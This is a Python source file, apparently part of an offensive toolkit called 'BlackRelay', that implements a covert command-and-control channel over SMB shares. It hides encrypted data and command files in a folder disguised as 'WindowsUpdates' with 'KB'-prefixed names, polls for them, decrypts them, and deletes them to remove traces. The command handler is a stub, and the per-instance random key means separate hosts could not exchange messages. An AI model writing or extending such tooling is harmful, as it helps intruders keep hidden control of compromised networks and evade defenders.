"""
BlackRelay SMB Protocol
Implementation of SMB/file-based covert communications
"""
import os
import time
import json
import struct
import hashlib
import logging
import threading
import queue
import random
import shutil
import glob
from typing import Dict, Any, Optional, List, Tuple, Union, Callable

try:
    from blackcypher.encryption import SymmetricEncryption, AsymmetricEncryption
except ImportError:
    # Fallback for standalone testing
    from encryptor import SymmetricEncryption, AsymmetricEncryption


class SmbProtocol:
    """SMB/file-based covert communications protocol implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the SMB protocol handler
        
        Args:
            config: Protocol configuration
        """
        self.config = config
        self.logger = logging.getLogger("BlackRelay.SmbProtocol")
        self.running = False
        
        # Extract configuration
        self.share_path = config.get("share_path", "")  # Path to share directory
        self.share_name = config.get("share_name", "Updates")
        self.folder_path = config.get("folder_path", "WindowsUpdates")
        self.poll_interval = config.get("poll_interval", 30)  # seconds
        self.max_file_size = config.get("max_file_size", 1048576)  # 1MB
        self.file_prefix = config.get("file_prefix", "KB")
        self.check_pattern = config.get("check_pattern", "*.dat")
        self.command_pattern = config.get("command_pattern", "cmd_*.json")
        self.cleanup_files = config.get("cleanup_files", True)
        self.metadata_extension = config.get("metadata_extension", ".meta")
        
        # Construct full path
        if self.share_path:
            self.full_path = os.path.join(self.share_path, self.folder_path)
        else:
            self.full_path = self.folder_path
            
        # Message queue
        self.receive_queue = queue.Queue()
        
        # Callbacks
        self.data_handler = None
        
        # Setup encryption
        self.encryption_key = os.urandom(32)  # 256-bit key for AES-256
        
        self.logger.info(f"SMB Protocol initialized with path: {self.full_path}")
    
    def start(self):
        """Start the SMB protocol handler"""
        if self.running:
            return
            
        self.running = True
        
        try:
            # Create directory if it doesn't exist
            os.makedirs(self.full_path, exist_ok=True)
            
            # Start polling thread
            self.poller_thread = threading.Thread(target=self._poller_loop)
            self.poller_thread.daemon = True
            self.poller_thread.start()
            
            # Start processor thread
            self.processor_thread = threading.Thread(target=self._process_received_messages)
            self.processor_thread.daemon = True
            self.processor_thread.start()
            
            self.logger.info(f"SMB Protocol started with path: {self.full_path}")
        except Exception as e:
            self.logger.error(f"Failed to start SMB Protocol: {e}")
            self.running = False
    
    def stop(self):
        """Stop the SMB protocol handler"""
        if not self.running:
            return
            
        self.running = False
        
        self.logger.info("SMB Protocol stopped")
    
    def send_data(self, data: Union[str, bytes], metadata: Optional[Dict[str, Any]] = None) -> bool:
        """Send data via SMB/file write
        
        Args:
            data: Data to send
            metadata: Optional metadata to include
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Convert string to bytes if needed
            if isinstance(data, str):
                data = data.encode('utf-8')
                
            # Encrypt data
            encrypted = SymmetricEncryption.encrypt(data, self.encryption_key)
            
            # Generate filename
            timestamp = int(time.time())
            random_val = random.randint(1000, 9999)
            filename = f"{self.file_prefix}{timestamp}_{random_val}.dat"
            filepath = os.path.join(self.full_path, filename)
            
            # Combine IV, ciphertext, and tag
            file_data = encrypted['iv'] + encrypted['ciphertext'] + encrypted['tag']
            
            # Write file
            with open(filepath, 'wb') as f:
                f.write(file_data)
                
            # Write metadata if provided
            if metadata:
                metadata.update({
                    "timestamp": timestamp,
                    "size": len(data),
                    "encrypted_size": len(file_data)
                })
                
                # Write metadata file
                meta_filepath = filepath + self.metadata_extension
                with open(meta_filepath, 'w') as f:
                    json.dump(metadata, f)
                    
            self.logger.debug(f"Data written to file: {filepath}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending data via SMB: {e}")
            return False
    
    def send_command(self, command: str, params: Dict[str, Any]) -> bool:
        """Send a command via SMB/file write
        
        Args:
            command: Command name
            params: Command parameters
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Create command data
            command_data = {
                "cmd": command,
                "params": params,
                "timestamp": time.time(),
                "id": hashlib.md5(f"{command}:{time.time()}:{random.random()}".encode()).hexdigest()
            }
            
            # Encode as JSON
            command_json = json.dumps(command_data).encode('utf-8')
            
            # Generate filename
            timestamp = int(time.time())
            random_val = random.randint(1000, 9999)
            filename = f"cmd_{timestamp}_{random_val}.json"
            filepath = os.path.join(self.full_path, filename)
            
            # Encrypt data
            encrypted = SymmetricEncryption.encrypt(command_json, self.encryption_key)
            
            # Combine IV, ciphertext, and tag
            file_data = encrypted['iv'] + encrypted['ciphertext'] + encrypted['tag']
            
            # Write file
            with open(filepath, 'wb') as f:
                f.write(file_data)
                
            self.logger.debug(f"Command written to file: {filepath}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending command via SMB: {e}")
            return False
    
    def register_data_handler(self, handler: Callable):
        """Register a handler for received data
        
        Args:
            handler: Function to call when data is received
        """
        self.data_handler = handler
    
    def _poller_loop(self):
        """Main loop for polling files"""
        # Keep track of processed files
        processed_files = set()
        
        while self.running:
            try:
                # Check for data files
                data_pattern = os.path.join(self.full_path, self.check_pattern)
                data_files = glob.glob(data_pattern)
                
                # Check for command files
                command_pattern = os.path.join(self.full_path, self.command_pattern)
                command_files = glob.glob(command_pattern)
                
                # Process new data files
                for filepath in data_files:
                    if filepath in processed_files:
                        continue
                        
                    # Process file
                    try:
                        # Check file size
                        file_size = os.path.getsize(filepath)
                        if file_size > self.max_file_size:
                            self.logger.warning(f"File too large: {filepath} ({file_size} bytes)")
                            processed_files.add(filepath)
                            continue
                            
                        # Check file age (should be at least 1 second old to avoid partial writes)
                        file_age = time.time() - os.path.getmtime(filepath)
                        if file_age < 1.0:
                            self.logger.debug(f"File too new, skipping for now: {filepath}")
                            continue
                            
                        # Read file
                        with open(filepath, 'rb') as f:
                            file_data = f.read()
                            
                        # Check for metadata
                        metadata = {}
                        meta_filepath = filepath + self.metadata_extension
                        if os.path.exists(meta_filepath):
                            with open(meta_filepath, 'r') as f:
                                try:
                                    metadata = json.load(f)
                                except json.JSONDecodeError:
                                    self.logger.warning(f"Invalid metadata file: {meta_filepath}")
                        
                        # Queue file data for processing
                        self.receive_queue.put({
                            "type": "data",
                            "filepath": filepath,
                            "data": file_data,
                            "metadata": metadata
                        })
                        
                        # Add to processed files
                        processed_files.add(filepath)
                        
                        # Clean up file if configured
                        if self.cleanup_files:
                            # We'll remove the file after processing in the processing thread
                            pass
                        else:
                            # Rename file to indicate it's been processed
                            processed_path = filepath + ".processed"
                            try:
                                os.rename(filepath, processed_path)
                            except OSError:
                                self.logger.warning(f"Could not rename processed file: {filepath}")
                        
                    except Exception as e:
                        self.logger.error(f"Error processing data file {filepath}: {e}")
                        # Add to processed files to avoid trying again
                        processed_files.add(filepath)
                
                # Process new command files
                for filepath in command_files:
                    if filepath in processed_files:
                        continue
                        
                    # Process file
                    try:
                        # Check file size
                        file_size = os.path.getsize(filepath)
                        if file_size > self.max_file_size:
                            self.logger.warning(f"Command file too large: {filepath} ({file_size} bytes)")
                            processed_files.add(filepath)
                            continue
                            
                        # Check file age (should be at least 1 second old to avoid partial writes)
                        file_age = time.time() - os.path.getmtime(filepath)
                        if file_age < 1.0:
                            self.logger.debug(f"Command file too new, skipping for now: {filepath}")
                            continue
                            
                        # Read file
                        with open(filepath, 'rb') as f:
                            file_data = f.read()
                            
                        # Queue file data for processing
                        self.receive_queue.put({
                            "type": "command",
                            "filepath": filepath,
                            "data": file_data
                        })
                        
                        # Add to processed files
                        processed_files.add(filepath)
                        
                    except Exception as e:
                        self.logger.error(f"Error processing command file {filepath}: {e}")
                        # Add to processed files to avoid trying again
                        processed_files.add(filepath)
                
                # Limit size of processed_files set to prevent memory growth
                if len(processed_files) > 1000:
                    processed_files = set(list(processed_files)[-500:])
                
                # Sleep for a while
                time.sleep(self.poll_interval)
                
            except Exception as e:
                self.logger.error(f"Error in poller loop: {e}")
                time.sleep(self.poll_interval)
    
    def _process_received_messages(self):
        """Process received messages"""
        while self.running:
            try:
                # Get message from queue with timeout
                try:
                    message = self.receive_queue.get(timeout=1.0)
                    
                    # Extract message data
                    msg_type = message["type"]
                    filepath = message["filepath"]
                    file_data = message["data"]
                    
                    # Process based on message type
                    if msg_type == "data":
                        # Data message
                        self._process_data_file(filepath, file_data, message.get("metadata", {}))
                    elif msg_type == "command":
                        # Command message
                        self._process_command_file(filepath, file_data)
                        
                    # Mark as done
                    self.receive_queue.task_done()
                    
                    # Clean up file if configured
                    if self.cleanup_files:
                        try:
                            os.remove(filepath)
                            
                            # Remove metadata file if it exists
                            meta_filepath = filepath + self.metadata_extension
                            if os.path.exists(meta_filepath):
                                os.remove(meta_filepath)
                                
                            self.logger.debug(f"Removed processed file: {filepath}")
                        except OSError as e:
                            self.logger.warning(f"Could not remove processed file {filepath}: {e}")
                    
                except queue.Empty:
                    # No message to process
                    pass
            except Exception as e:
                self.logger.error(f"Error processing received message: {e}")
    
    def _process_data_file(self, filepath: str, data: bytes, metadata: Dict[str, Any]):
        """Process a data file
        
        Args:
            filepath: Path to the file
            data: File contents
            metadata: File metadata
        """
        try:
            # Decrypt data
            # Split into IV, ciphertext, and tag
            iv = data[:12]
            ciphertext = data[12:-16]
            tag = data[-16:]
            
            # Decrypt
            try:
                plaintext = SymmetricEncryption.decrypt({
                    'iv': iv,
                    'ciphertext': ciphertext,
                    'tag': tag
                }, self.encryption_key)
            except Exception as e:
                self.logger.error(f"Decryption failed for file {filepath}: {e}")
                return
                
            # Process the decrypted data
            if self.data_handler:
                self.data_handler(plaintext, f"file://{filepath}", metadata)
                
            self.logger.debug(f"Processed data file: {filepath}")
            
        except Exception as e:
            self.logger.error(f"Error processing data file {filepath}: {e}")
    
    def _process_command_file(self, filepath: str, data: bytes):
        """Process a command file
        
        Args:
            filepath: Path to the file
            data: File contents
        """
        try:
            # Decrypt data
            # Split into IV, ciphertext, and tag
            iv = data[:12]
            ciphertext = data[12:-16]
            tag = data[-16:]
            
            # Decrypt
            try:
                plaintext = SymmetricEncryption.decrypt({
                    'iv': iv,
                    'ciphertext': ciphertext,
                    'tag': tag
                }, self.encryption_key)
            except Exception as e:
                self.logger.error(f"Decryption failed for command file {filepath}: {e}")
                return
                
            # Parse JSON
            try:
                command_data = json.loads(plaintext.decode('utf-8'))
                
                # Extract command info
                command = command_data.get("cmd")
                params = command_data.get("params", {})
                command_id = command_data.get("id")
                
                self.logger.info(f"Received command: {command} (ID: {command_id})")
                
                # Process command (implementation depends on specific commands)
                # ...
                
                # Send response
                response = {
                    "status": "ok",
                    "command_id": command_id,
                    "timestamp": time.time()
                }
                
                response_filepath = os.path.join(os.path.dirname(filepath), f"resp_{os.path.basename(filepath)}")
                
                # Write response
                with open(response_filepath, 'w') as f:
                    json.dump(response, f)
                    
            except json.JSONDecodeError:
                self.logger.error(f"Invalid command format in file {filepath}")
                
            self.logger.debug(f"Processed command file: {filepath}")
            
        except Exception as e:
            self.logger.error(f"Error processing command file {filepath}: {e}")